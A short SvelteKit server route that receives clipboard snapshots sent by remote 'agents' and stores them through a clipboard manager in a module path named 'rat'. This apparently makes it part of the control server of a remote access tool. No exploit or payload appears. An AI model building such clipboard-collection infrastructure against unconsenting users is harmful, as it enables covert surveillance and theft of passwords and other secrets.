import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { clipboardManager, ClipboardError } from '$lib/server/rat/clipboard';
import type { ClipboardStateEnvelope } from '$lib/types/clipboard';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: ClipboardStateEnvelope;
	try {
		payload = (await request.json()) as ClipboardStateEnvelope;
	} catch {
		throw error(400, 'Invalid clipboard snapshot payload');
	}

	try {
		const snapshot = clipboardManager.ingestState(id, payload);
		return json({ accepted: true, sequence: snapshot.sequence });
	} catch (err) {
		if (err instanceof ClipboardError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to ingest clipboard snapshot');
	}
};
